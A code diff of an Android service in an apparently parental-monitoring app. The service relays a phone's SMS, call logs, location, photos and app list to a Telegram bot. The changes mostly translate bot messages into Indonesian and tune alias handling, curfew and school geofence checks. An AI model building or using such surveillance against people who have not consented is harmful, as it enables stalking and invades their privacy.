@@ -1132,15 +1132,20 @@ class MonitoringService : Service() {
                     }
                     val ownerOk = isOwner(senderId)
                     if (chatOk || ownerOk) {
-                        val aliasInput = resolveAliasInput(command, arg)
-                        if (aliasInput != null) {
-                            handleTelegramCommand(aliasInput, message?.date ?: 0, ownerOk, chatOk, false, senderId)
-                        } else if (command.startsWith("/")) {
-                            val input = if (arg.isEmpty()) command else "$command $arg"
-                            val wakeSeen = command == "/ping" && try { preferencesManager.wakePingSeen(update.updateId) } catch (_: Exception) { false }
+                        if (command.startsWith("/")) {
+                            val aliasInput = resolveAliasInput(command, arg)
+                            val input = aliasInput ?: if (arg.isEmpty()) command else "$command $arg"
+                            val effCommand = input.substringBefore(" ")
+                            val wakeSeen = effCommand == "/ping" && try { preferencesManager.wakePingSeen(update.updateId) } catch (_: Exception) { false }
                             handleTelegramCommand(input, message?.date ?: 0, ownerOk, chatOk, wakeSeen, senderId)
                             if (wakeSeen) {
                                 try { preferencesManager.removeWakePingId(update.updateId) } catch (_: Exception) { }
+                            }
+                        } else {
+                            val aliasInput = resolveAliasInput(command, arg)
+                            val privateOwner = ownerOk && msgChatId.isNotEmpty() && msgChatId == senderId
+                            if (aliasInput != null && privateOwner) {
+                                handleTelegramCommand(aliasInput, message?.date ?: 0, ownerOk, chatOk, false, senderId)
                             }
                         }
                     }
@@ -1380,16 +1385,8 @@ class MonitoringService : Service() {
             return
         }
         val parts = raw.split(CMD_SPLIT_REGEX, limit = 2)
-        var command = parts[0]
-        var arg = parts.getOrNull(1)?.trim().orEmpty()
-        try {
-            val alias = resolveAliasInput(command, arg)
-            if (alias != null) {
-                val sp = alias.indexOf(' ')
-                if (sp < 0) { command = alias; arg = "" } else { command = alias.substring(0, sp); arg = alias.substring(sp + 1).trim() }
-            }
-        } catch (_: Exception) {
-        }
+        val command = parts[0]
+        val arg = parts.getOrNull(1)?.trim().orEmpty()
         try {
             handleTelegramCommandInner(command, arg, sentAtSec, senderOk, chatOk, wakeSeen, senderId)
         } catch (e: kotlinx.coroutines.CancellationException) {
@@ -1473,7 +1470,7 @@ class MonitoringService : Service() {
                         appendLine("Kamera: ${preferencesManager.cameraFacing}")
                         appendLine("Malam: " + if (preferencesManager.nightMode) "JALAN 23–05" + if (isNightPaused()) " (sunyi sekarang)" else "" else "mati")
                         appendLine("Watch: " + (watchList().takeIf { it.isNotEmpty() }?.joinToString(",") ?: "mati"))
-                        appendLine("Fence: " + fenceStatusText(true) + " / " + fenceStatusText(false))
+                        appendLine("Rumah: " + fenceStatusText(true) + " · Sekolah: " + fenceStatusText(false))
                         appendLine("Izin kamera: ${if (hasCameraPermission()) "ada" else "HILANG"}")
                         appendLine("Izin lokasi: ${if (hasLocationPermission()) "ada" else "HILANG"}")
                         appendLine("Lokasi latar: ${if (hasBackgroundLocation()) "ada" else "HILANG"}")
@@ -1606,18 +1603,18 @@ class MonitoringService : Service() {
             }
             "/location" -> {
                 if (!hasLocationPermission()) {
-                    sendToTelegram("⚠️ Location permission missing. Open Setup and grant Location permission.")
+                    sendToTelegram("⚠️ Izin lokasi hilang. Buka Setup dan berikan izin Lokasi.")
                 } else {
-                    sendToTelegram("📍 Locating…")
+                    sendToTelegram("📍 Mencari lokasi…")
                     val location = fetchLocation()
                     if (location == null) {
-                        sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
+                        sendToTelegram("⚠️ Lokasi tak didapat. Nyalakan Lokasi/GPS.")
                     } else {
                         val prev = lastSentLatLon()
                         val dist = if (prev == null) -1f else distanceMeters(prev.first, prev.second, location.latitude, location.longitude)
                         rememberSentLatLon(location.latitude, location.longitude)
                         val near = if (dist >= 0f) "\nJarak dari laporan terakhir: ${dist.toInt()} m" else ""
-                        sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m$near")
+                        sendToTelegram("📍 <b>Lokasi</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAkurasi: ±${location.accuracy.toInt()} m$near")
                     }
                 }
             }
@@ -1625,14 +1622,14 @@ class MonitoringService : Service() {
                 when (arg.lowercase(java.util.Locale.ROOT)) {
                     "belakang", "back" -> {
                         preferencesManager.cameraFacing = "back"
-                        sendToTelegram("📸 Camera set to back.")
+                        sendToTelegram("📸 Kamera disetel belakang.")
                     }
                     "depan", "front" -> {
                         preferencesManager.cameraFacing = "front"
-                        sendToTelegram("📸 Camera set to front.")
+                        sendToTelegram("📸 Kamera disetel depan.")
                     }
                     else -> {
-                        sendToTelegram("Cara pakai: /camera \u003cfront|back\u003e (now: ${preferencesManager.cameraFacing})")
+                        sendToTelegram("Cara pakai: /camera \u003cdepan|belakang\u003e (kini: ${preferencesManager.cameraFacing})")
                     }
                 }
             }
@@ -1670,19 +1667,19 @@ class MonitoringService : Service() {
                         CrashReporter.clearPending(this)
                     }
                 } else {
-                    sendToTelegram("\uD83E\uDDFE No crash recorded.")
+                    sendToTelegram("\uD83E\uDDFE Belum ada crash.")
                 }
                 sendToTelegram(
                     buildString {
-                        appendLine("\uD83E\uDDFE <b>Error log</b>")
+                        appendLine("\uD83E\uDDFE <b>Log error</b>")
                         val credErr = try {
                             preferencesManager.credentialError
                         } catch (_: Exception) {
                             ""
                         }
                         appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "FAILED ($credErr)")
-                        appendLine("Queued: ${messageQueue.getQueueSize()}")
-                        appendLine("Storage: " + if (preferencesManager.isStorageEncrypted) "encrypted" else "volatile")
+                        appendLine("Antrean: ${messageQueue.getQueueSize()}")
+                        appendLine("Penyimpanan: " + if (preferencesManager.isStorageEncrypted) "terenkripsi" else "volatil")
                         val camErr = try {
                             preferencesManager.lastCameraErrorNotice
                         } catch (_: Exception) {
@@ -1968,10 +1965,10 @@ class MonitoringService : Service() {
             "/version" -> {
                 sendToTelegram(
                     buildString {
-                        appendLine("\u2139\uFE0F <b>Version</b>")
-                        appendLine("App: " + com.redeye.parentalmonitor.BuildConfig.VERSION_NAME + " (" + com.redeye.parentalmonitor.BuildConfig.VERSION_CODE + ")")
+                        appendLine("\u2139\uFE0F <b>Versi</b>")
+                        appendLine("Aplikasi: " + com.redeye.parentalmonitor.BuildConfig.VERSION_NAME + " (" + com.redeye.parentalmonitor.BuildConfig.VERSION_CODE + ")")
                         appendLine("Android: " + Html.escape(Build.VERSION.SDK_INT.toString()) + " (" + Html.escape(Build.VERSION.RELEASE) + ")")
-                        appendLine("Device: " + Html.escape(Build.MANUFACTURER) + " " + Html.escape(Build.MODEL))
+                        appendLine("HP: " + Html.escape(Build.MANUFACTURER) + " " + Html.escape(Build.MODEL))
                     }
                 )
             }
@@ -2020,11 +2017,11 @@ class MonitoringService : Service() {
                 val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
                 val apps = listLaunchableApps(limit)
                 if (apps.isEmpty()) {
-                    sendToTelegram("\uD83D\uDCE6 No apps found.")
+                    sendToTelegram("\uD83D\uDCE6 Tak ada aplikasi.")
                 } else {
                     sendToTelegram(
                         buildString {
-                            appendLine("\uD83D\uDCE6 <b>Apps (${apps.size})</b>")
+                            appendLine("\uD83D\uDCE6 <b>Aplikasi (${apps.size})</b>")
                             for (label in apps) {
                                 appendLine("\u2022 " + Html.escape(label))
                             }
@@ -2036,9 +2033,9 @@ class MonitoringService : Service() {
                 val stats = withContext(Dispatchers.IO) { cacheStats() }
                 sendToTelegram(
                     buildString {
-                        appendLine("\uD83D\uDCBE <b>Storage</b>")
-                        appendLine("Cache: " + formatBytes(stats.bytes) + " (" + stats.photos + " photos, " + stats.audios + " audio, " + stats.videos + " video)")
-                        appendLine("Queued: ${messageQueue.getQueueSize()}")
+                        appendLine("\uD83D\uDCBE <b>Penyimpanan</b>")
+                        appendLine("Cache: " + formatBytes(stats.bytes) + " (" + stats.photos + " foto, " + stats.audios + " audio, " + stats.videos + " video)")
+                        appendLine("Antrean: ${messageQueue.getQueueSize()}")
                     }
                 )
             }
@@ -2126,6 +2123,7 @@ class MonitoringService : Service() {
             }
             "/digest" -> {
                 sendDailyDigest(manual = true)
+                try { preferencesManager.nightDigestDate = todayKey() } catch (_: Exception) { }
             }
             "/darurat" -> {
                 val level = batteryLevel()
@@ -2150,7 +2148,8 @@ class MonitoringService : Service() {
                 val sub = arg.trim()
                 if (sub.isEmpty() || sub.equals("status", ignoreCase = true)) {
                     val cur = try { preferencesManager.curfewTime } catch (_: Exception) { "" }
-                    sendToTelegram(if (cur.isEmpty()) "🌙 Jam malam: off (contoh: /jampulang 21:30)" else "🌙 Jam malam: $cur")
+                    val school = fenceStatusText(false)
+                    sendToTelegram("🌙 Jam malam: " + (cur.ifEmpty { "mati" }) + "\n🏫 Cek sekolah 08–16 (Senin–Jumat): " + school)
                 } else if (sub.equals("off", ignoreCase = true)) {
                     preferencesManager.curfewTime = ""
                     sendToTelegram("🌙 Jam malam dimatikan.")
@@ -2238,7 +2237,7 @@ class MonitoringService : Service() {
                         appendLine("/watchnomor \u003cnomor|status|off\u003e - awasi nomor")
                         appendLine("/home \u003clat,lon,rad|status|off\u003e - geofence rumah")
                         appendLine("/school \u003clat,lon,rad|status|off\u003e - geofence sekolah")
-                        appendLine("/jampulang \u003cHH:MM|off\u003e - jam malam")
+                        appendLine("/jampulang \u003cHH:MM|off\u003e - jam malam + cek sekolah 08–16")
                         appendLine("/digest - ringkasan harian")
                         appendLine("/minggu - laporan 7 hari")
                         appendLine("/log - log error terakhir")
@@ -2594,22 +2593,22 @@ class MonitoringService : Service() {
                 val leftMin = ((photoPausedElapsed() - System.currentTimeMillis()) / 60_000L).coerceAtLeast(1L)
                 "paused ($leftMin min left)"
             } else if (preferencesManager.cameraInterval <= 0) {
-                "manual only (/photo)"
+                "manual saja (/photo)"
             } else {
-                "every ${preferencesManager.cameraInterval} min"
+                "tiap ${preferencesManager.cameraInterval} mnt"
             }
             val completeMessage = buildString {
-                appendLine("✅ <b>History sync complete</b>")
+                appendLine("✅ <b>Sinkron riwayat selesai</b>")
                 appendLine()
-                appendLine("From now on, only new SMS and calls will be sent.")
+                appendLine("Mulai sekarang, hanya SMS dan panggilan baru yang dikirim.")
                 appendLine()
-                appendLine("📊 <b>Now</b>")
-                appendLine("Monitoring: ON")
-                appendLine("Data interval: ${preferencesManager.syncInterval} min")
-                appendLine("Photos: $photoState")
-                appendLine("Queued: ${messageQueue.getQueueSize()}")
+                appendLine("📊 <b>Kini</b>")
+                appendLine("Monitoring: JALAN")
+                appendLine("Interval data: tiap ${preferencesManager.syncInterval} mnt")
+                appendLine("Foto: $photoState")
+                appendLine("Antrean: ${messageQueue.getQueueSize()}")
                 appendLine()
-                appendLine("All commands are in the bot menu — tap /help anytime.")
+                appendLine("Semua perintah ada di menu bot — ketuk /help kapan saja.")
             }
             if (initialOk && !smsTruncated && !callTruncated) {
                 sendToTelegram(completeMessage)
@@ -2643,8 +2642,10 @@ class MonitoringService : Service() {
                 found = true
                 var smsCursor = lastSms
                 var smsSentAny = false
+                val freqMap = try { batchFreqMap() } catch (_: Exception) { null }
+                val knownMap = try { smsPage.map { it.address }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
                 for (part in smsPage.chunked(10)) {
-                    val sentSms = sendFitted(formatSmsMessage(part))
+                    val sentSms = sendFitted(formatSmsMessage(part, freqMap, knownMap))
                     if (sentSms) {
                         smsCursor = maxOf(smsCursor, part.maxOf { it.id })
                         try { preferencesManager.setSmsCursorSync(smsCursor) } catch (_: Exception) { }
@@ -2672,8 +2673,9 @@ class MonitoringService : Service() {
             if (callPage.isNotEmpty()) {
                 found = true
                 var callSentAny = false
+                val callKnown = try { callPage.map { it.number }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
                 for (part in callPage.chunked(10)) {
-                    val sentCall = sendFitted(formatCallMessage(part))
+                    val sentCall = sendFitted(formatCallMessage(part, callKnown))
                     if (!sentCall) {
                         break
                     }
@@ -2831,7 +2833,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>): String {
+    private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>, freqMap: Map<String, Int>? = null, knownMap: Map<String, Boolean>? = null): String {
         return buildString {
             appendLine("💬 <b>SMS baru (${smsList.size})</b>")
             appendLine()
@@ -2845,9 +2847,11 @@ class MonitoringService : Service() {
                 } catch (_: Exception) {
                 }
                 try {
-                    val freq = todayCountFor(sms.address)
+                    val key = sms.address.filter { it.isDigit() }.takeLast(10)
+                    val freq = freqMap?.get(key) ?: todayCountFor(sms.address)
                     if (freq >= 3) appendLine("🔁 $freq x hari ini")
-                    if (!isKnownContact(sms.address)) appendLine("🆕 Nomor baru (tak ada di kontak)")
+                    val known = knownMap?.get(sms.address) ?: isKnownContact(sms.address)
+                    if (!known) appendLine("🆕 Nomor baru (tak ada di kontak)")
                 } catch (_: Exception) {
                 }
                 val full = Html.escape(sms.body)
@@ -2860,7 +2864,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>): String {
+    private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>, knownMap: Map<String, Boolean>? = null): String {
         return buildString {
             appendLine("📞 <b>Panggilan baru (${callList.size})</b>")
             appendLine()
@@ -2871,7 +2875,8 @@ class MonitoringService : Service() {
                     appendLine("👤 Nama: ${Html.escape(call.name)}")
                 } else {
                     try {
-                        if (!isKnownContact(call.number)) appendLine("🆕 Nomor baru (tak ada di kontak)")
+                        val known = knownMap?.get(call.number) ?: isKnownContact(call.number)
+                        if (!known) appendLine("🆕 Nomor baru (tak ada di kontak)")
                     } catch (_: Exception) {
                     }
                 }
@@ -3451,6 +3456,7 @@ class MonitoringService : Service() {
         try {
             preferencesManager.lastLocLatE6 = (lat * 1_000_000).toLong()
             preferencesManager.lastLocLonE6 = (lon * 1_000_000).toLong()
+            preferencesManager.lastLocAt = System.currentTimeMillis()
         } catch (_: Exception) {
         }
     }
@@ -3650,6 +3656,29 @@ class MonitoringService : Service() {
         }
     }
 
+    private fun batchFreqMap(): Map<String, Int> {
+        val m = HashMap<String, Int>()
+        try {
+            val since = System.currentTimeMillis() - 24 * 60 * 60_000L
+            try {
+                for (s in smsRepository.getRecentSmsSince(since, 200)) {
+                    val d = s.address.filter { it.isDigit() }.takeLast(10)
+                    if (d.length >= 7) m[d] = (m[d] ?: 0) + 1
+                }
+            } catch (_: Exception) {
+            }
+            try {
+                for (c in callLogRepository.getCallsSince(since, 200)) {
+                    val d = c.number.filter { it.isDigit() }.takeLast(10)
+                    if (d.length >= 7) m[d] = (m[d] ?: 0) + 1
+                }
+            } catch (_: Exception) {
+            }
+        } catch (_: Exception) {
+        }
+        return m
+    }
+
     private fun todayCountFor(number: String): Int {
         return try {
             val since = System.currentTimeMillis() - 24 * 60 * 60_000L
@@ -3681,8 +3710,8 @@ class MonitoringService : Service() {
             if (lastAlert <= now && now - lastAlert < 12 * 60 * 60_000L) return
             val notes = ArrayList<String>()
             val lastData = try { preferencesManager.lastDataAt } catch (_: Exception) { 0L }
-            if (lastData > 0 && now - lastData > 12 * 60 * 60_000L && !preferencesManager.monitoringPaused) {
-                notes.add("sepi >12 jam (data terakhir ${formatDate(lastData)})")
+            if (lastData > 0 && now - lastData > 48 * 60 * 60_000L && !preferencesManager.monitoringPaused) {
+                notes.add("sepi >48 jam (data terakhir ${formatDate(lastData)})")
             }
             val fails = try { preferencesManager.locFailCount } catch (_: Exception) { 0 }
             if (fails >= 5) {
@@ -3710,7 +3739,12 @@ class MonitoringService : Service() {
         return try {
             val list = watchNumbers()
             if (list.isEmpty()) return null
-            list.firstOrNull { w -> com.redeye.parentalmonitor.utils.PhoneNumbers.numbersEqualFast(number, w, null) }
+            val have = number.filter { it.isDigit() }
+            if (have.isEmpty()) return null
+            list.firstOrNull { w ->
+                have == w || (have.length >= 7 && w.length >= 7 &&
+                    (have.endsWith(w.takeLast(7)) || w.endsWith(have.takeLast(7))))
+            }
         } catch (_: Exception) {
             null
         }
@@ -3788,12 +3822,15 @@ class MonitoringService : Service() {
             val h = cal.get(java.util.Calendar.HOUR_OF_DAY)
             val day = cal.get(java.util.Calendar.DAY_OF_WEEK)
             val pos = lastSentLatLon() ?: return
+            val locAge = now - try { preferencesManager.lastLocAt } catch (_: Exception) { 0L }
+            if (locAge > 6 * 60 * 60_000L) return
             val curfew = try { preferencesManager.curfewTime } catch (_: Exception) { "" }
             if (CURFEW_REGEX.matches(curfew)) {
                 val parts = curfew.split(":")
                 val ch = parts[0].toIntOrNull() ?: -1
                 val cm = parts[1].toIntOrNull() ?: -1
-                if (ch >= 0 && (h > ch || (h == ch && cal.get(java.util.Calendar.MINUTE) >= cm))) {
+                val pastMidnight = h < 5 && ch >= 12
+                if (ch >= 0 && (h > ch || (h == ch && cal.get(java.util.Calendar.MINUTE) >= cm) || pastMidnight)) {
                     val la = try { preferencesManager.homeLatE6 } catch (_: Exception) { Long.MIN_VALUE }
                     val lo = try { preferencesManager.homeLonE6 } catch (_: Exception) { Long.MIN_VALUE }
                     val rad = try { preferencesManager.homeRadiusM } catch (_: Exception) { 0 }
@@ -3807,7 +3844,7 @@ class MonitoringService : Service() {
                     }
                 }
             }
-            if (day != java.util.Calendar.SATURDAY && day != java.util.Calendar.SUNDAY && h in 8..14) {
+            if (day != java.util.Calendar.SATURDAY && day != java.util.Calendar.SUNDAY && h in 8..15) {
                 val la = try { preferencesManager.schoolLatE6 } catch (_: Exception) { Long.MIN_VALUE }
                 val lo = try { preferencesManager.schoolLonE6 } catch (_: Exception) { Long.MIN_VALUE }
                 val rad = try { preferencesManager.schoolRadiusM } catch (_: Exception) { 0 }
